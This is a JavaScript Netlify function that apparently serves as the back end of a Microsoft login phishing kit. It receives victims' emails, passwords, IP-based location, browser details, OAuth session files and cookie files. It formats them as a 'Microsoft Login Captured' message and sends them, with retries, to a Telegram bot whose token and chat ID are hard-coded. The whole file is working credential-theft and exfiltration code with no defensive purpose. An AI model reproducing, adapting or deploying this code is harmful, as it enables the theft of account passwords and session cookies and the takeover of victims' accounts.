/**
 * PRODUCTION-READY: Telegram Bot Function for Netlify
 * ✅ SENDS: Email, Password, Location, Account Type
 * ✅ REMOVED: All validation status logic.
 * Updated: 2025-11-10 15:21:28 UTC by pixelogicm
 */

const https = require('https');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7534767475:AAEvUBQZl7QL5dQ6u6Cn6pLZ6sXfsJh2T-o';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '7385263059';

function detectAccountType(email) {
  if (!email) return { accountType: 'Unknown', domain: 'unknown' };
  
  const personalDomains = ['outlook.com', 'hotmail.com', 'live.com', 'msn.com'];
  const domain = email.split('@')[1]?.toLowerCase() || 'unknown';
  const isPersonal = personalDomains.includes(domain);
  const accountType = isPersonal ? 'Personal (MSA)' : 'Work/School (AAD)';
  
  return { accountType, domain };
}

function sendMessageToTelegram(text, parseMode = 'HTML') {
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: parseMode,
      disable_web_page_preview: true
    });

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      },
      timeout: 15000
    };

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        try {
          const response = JSON.parse(data);
          if (res.statusCode === 200 && response.ok) {
            console.log('✅ [TELEGRAM] Message sent');
            resolve(response);
          } else {
            reject(new Error(`Telegram API error: ${response.description || 'Unknown error'}`));
          }
        } catch (e) {
          reject(new Error(`Failed to parse Telegram response: ${e.message}`));
        }
      });
    });

    req.on('error', (error) => {
      console.error(`❌ [TELEGRAM] Message send error: ${error.message}`);
      reject(error);
    });

    req.on('timeout', () => {
      req.destroy();
      reject(new Error('Telegram request timeout'));
    });

    req.write(postData);
    req.end();
  });
}

function sendDocumentToTelegram(fileContent, fileName) {
  return new Promise((resolve, reject) => {
    const boundary = '----WebKitFormBoundary' + Math.random().toString(36).substring(2, 15);
    
    let body = `--${boundary}\r\n`;
    body += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
    body += `${TELEGRAM_CHAT_ID}\r\n`;
    body += `--${boundary}\r\n`;
    body += `Content-Disposition: form-data; name="document"; filename="${fileName}"\r\n`;
    body += `Content-Type: application/json\r\n\r\n`;
    body += fileContent;
    body += `\r\n--${boundary}--\r\n`;

    const bodyBuffer = Buffer.from(body, 'utf8');

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Content-Length': bodyBuffer.length
      },
      timeout: 15000
    };

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        try {
          const response = JSON.parse(data);
          if (res.statusCode === 200 && response.ok) {
            console.log('✅ [TELEGRAM] Document sent successfully');
            resolve(response);
          } else {
            console.error('❌ [TELEGRAM] API rejected:', response.description);
            reject(new Error(`Telegram API error: ${response.description || 'Unknown error'}`));
          }
        } catch (e) {
          console.error('❌ [TELEGRAM] Parse error:', e.message);
          reject(new Error(`Failed to parse Telegram response: ${e.message}`));
        }
      });
    });

    req.on('error', (error) => {
      console.error(`❌ [TELEGRAM] Document send error: ${error.message}`);
      reject(error);
    });

    req.on('timeout', () => {
      console.error('❌ [TELEGRAM] Document send timeout');
      req.destroy();
      reject(new Error('Telegram request timeout'));
    });

    req.write(bodyBuffer);
    req.end();
  });
}

function formatMainMessage(data) {
  // Helper to escape HTML special characters
  const escapeHtml = (text) => {
    if (!text) return '';
    return String(text)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  };

  // Detect account type
  const { accountType, domain } = detectAccountType(data.email);

  // Build message in HTML format
  let message = `<b>🔐 Microsoft Login Captured</b>\n`;
  message += `━━━━━━━━━━━━━━━━━━━━\n`;
  
  if (data.email) {
    message += `<b>📧 Email:</b> <code>${escapeHtml(data.email)}</code>\n`;
  }
  
  if (data.password) {
    message += `<b>🔑 Password:</b> <code>${escapeHtml(data.password)}</code>\n`;
  }
  
  message += `<b>🏢 Account Type:</b> ${accountType}\n`;
  message += `<b>📍 Domain:</b> ${domain}\n`;

  // Location data
  if (data.locationData && data.locationData.ip) {
    message += `\n<b>🌍 Location Info:</b>\n`;
    message += `<b>IP:</b> ${data.locationData.ip}\n`;
    
    if (data.locationData.city) {
      message += `<b>City:</b> ${escapeHtml(data.locationData.city)}\n`;
    }
    if (data.locationData.region || data.locationData.region_code) {
      message += `<b>State/Region:</b> ${escapeHtml(data.locationData.region || data.locationData.region_code)}\n`;
    }
    if (data.locationData.country || data.locationData.country_name) {
      message += `<b>Country:</b> ${escapeHtml(data.locationData.country_name || data.locationData.country)}\n`;
    }
  }

  // Timestamp and browser info
  message += `\n<b>🕐 Timestamp:</b> ${new Date().toISOString()}\n`;
  
  if (data.userAgent) {
    // Parse user agent for browser info
    let browser = 'Unknown';
    if (data.userAgent.includes('Chrome')) browser = 'Chrome';
    else if (data.userAgent.includes('Firefox')) browser = 'Firefox';
    else if (data.userAgent.includes('Safari')) browser = 'Safari';
    else if (data.userAgent.includes('Edge')) browser = 'Edge';
    
    const shortUserAgent = data.userAgent.length > 50 
      ? data.userAgent.substring(0, 50) + '...' 
      : data.userAgent;
    
    message += `<b>🌐 User Agent:</b> ${escapeHtml(shortUserAgent)}\n`;
    message += `<b>🖥️ Browser:</b> ${browser}\n`;
  }
  
  if (data.platform) {
    message += `<b>📱 Platform:</b> ${escapeHtml(data.platform)}\n`;
  }
  
  message += `━━━━━━━━━━━━━━━━━━━━`;

  return message;
}

async function sendWithRetry(sendFn, maxRetries = 3, initialDelay = 2000) {
  let lastError;
  
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      console.log(`🔄 [RETRY] Attempt ${attempt + 1}/${maxRetries + 1}`);
      const result = await sendFn();
      return result;
    } catch (error) {
      lastError = error;
      console.error(`❌ [RETRY] Attempt ${attempt + 1} failed: ${error.message}`);
      
      if (attempt < maxRetries) {
        const delay = initialDelay * Math.pow(2, attempt);
        console.log(`⏳ [RETRY] Waiting ${delay}ms before retry...`);
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    }
  }

  throw lastError;
}

exports.handler = async (event, context) => {
  console.log('═══════════════════════════════════════════');
  console.log('🚀 [HANDLER] Starting sendTelegram handler');
  console.log(`📅 [HANDLER] Time: ${new Date().toISOString()}`);
  console.log(`👤 [HANDLER] User: pixelogicm`);
  console.log('═══════════════════════════════════════════');

  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type, Accept',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Content-Type': 'application/json'
  };

  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ message: 'OK' })
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    let requestData;
    try {
      requestData = JSON.parse(event.body || '{}');
    } catch (error) {
      console.error('❌ JSON parse error:', error);
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'Invalid JSON in request body' })
      };
    }

    const { 
      email, 
      password, 
      locationData = {}, 
      userAgent, 
      platform,
      oauth,
      sessionData,
      cookies = [],
      cookieFiles = {} 
    } = requestData;

    console.log('📊 [HANDLER] Received data:', {
      email: !!email,
      password: !!password,
      hasLocation: !!locationData.ip,
      hasUserAgent: !!userAgent,
      hasPlatform: !!platform,
      hasOAuth: !!oauth,
      cookieCount: cookies.length
    });

    if (!email && !password) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'Email and password required' })
      };
    }

    let messagesSent = 0;
    const results = {
      mainMessage: false,
      oauthFile: false,
      cookieFile: false
    };

    // Send main credentials message
    console.log('═══════════════════════════════════════════');
    console.log('📨 [HANDLER] Sending main message...');
    console.log('═══════════════════════════════════════════');
    
    try {
      const mainMessage = formatMainMessage({
        email,
        password,
        locationData,
        userAgent: userAgent || requestData.userAgent,
        platform: platform || requestData.platform
      });

      console.log('📝 Message preview (first 200 chars):', mainMessage.substring(0, 200));

      await sendWithRetry(() => sendMessageToTelegram(mainMessage, 'HTML'));
      
      results.mainMessage = true;
      messagesSent++;
      console.log('✅ [HANDLER] Main message sent successfully');
    } catch (error) {
      console.error('❌ [HANDLER] Failed to send main message:', error.message);
    }

    // Send file attachments if they exist
    if (cookieFiles && cookieFiles.oauthSessionFile && cookieFiles.oauthSessionFile.content) {
      console.log('📁 [HANDLER] Sending OAuth/Session file...');
      try {
        await sendWithRetry(() => sendDocumentToTelegram(cookieFiles.oauthSessionFile.content, cookieFiles.oauthSessionFile.name));
        results.oauthFile = true;
      } catch (error) {
        console.error('❌ [HANDLER] Failed to send OAuth file:', error.message);
      }
    }

    if (cookieFiles && cookieFiles.jsonFile && cookieFiles.jsonFile.content) {
      console.log('🍪 [HANDLER] Sending cookie file...');
      try {
        await sendWithRetry(() => sendDocumentToTelegram(cookieFiles.jsonFile.content, cookieFiles.jsonFile.name));
        results.cookieFile = true;
      } catch (error) {
        console.error('❌ [HANDLER] Failed to send cookie file:', error.message);
      }
    }

    console.log('═══════════════════════════════════════════');
    console.log(`✅ [HANDLER] Request completed. Messages sent: ${messagesSent}`);
    console.log(`📅 [HANDLER] Completed at: ${new Date().toISOString()}`);
    console.log('═══════════════════════════════════════════');

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        message: 'Data transmitted to Telegram successfully',
        timestamp: new Date().toISOString(),
        user: 'pixelogicm',
        transmitted: {
          mainMessage: results.mainMessage,
          oauthFile: results.oauthFile,
          cookieFile: results.cookieFile,
          email: !!email,
          password: !!password,
          location: !!locationData.ip,
          messagesSent
        }
      })
    };

  } catch (error) {
    console.error('═══════════════════════════════════════════');
    console.error('❌❌❌ HANDLER FATAL ERROR');
    console.error('═══════════════════════════════════════════');
    console.error('Message:', error.message);
    console.error('Stack:', error.stack);
    console.error(`Time: ${new Date().toISOString()}`);
    console.error('User: pixelogicm');
    console.error('═══════════════════════════════════════════');
    
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'Server error',
        message: error.message,
        timestamp: new Date().toISOString(),
        user: 'pixelogicm'
      })
    };
  }
};